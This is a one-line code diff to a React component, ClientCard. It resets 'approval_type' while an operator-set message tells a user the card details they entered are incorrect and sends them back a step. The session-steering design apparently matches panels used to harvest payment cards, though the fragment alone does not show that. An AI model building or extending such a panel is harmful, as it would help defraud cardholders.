@@ -193,6 +193,7 @@ export function ClientCard({ session, isSelected = false, onToggleSelect }: Clie
       .from("client_sessions")
       .update({ 
         current_step: 2,
+        approval_type: null,
         admin_message: "The card details you entered are incorrect. Please check and try again.",
         message_type: "error"
       })
